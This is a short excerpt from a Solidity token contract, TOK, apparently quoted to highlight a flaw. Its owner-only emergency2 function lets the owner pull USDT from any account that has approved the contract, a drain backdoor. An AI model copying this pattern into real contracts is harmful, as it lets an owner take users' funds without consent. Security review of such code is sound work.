...
contract TOK is Ownable,ERC20Burnable {
    ...
    function emergency2(address _token, address payable _account,uint _amount) external onlyOwner{
        if(_token == address(0)){
           _account.transfer(_amount);
        }else{
            IERC20(USDT).transferFrom(_account, address(this), _amount);
        }
    }
    ...
    function setSubAccount(address[] calldata accounts) external{
        ...
        require(accounts.length < 100, "The number of sub accounts exceeds 99");
    ...
    function getMainAccount(address account) public view returns (address _account, address[99] memory subAccount){
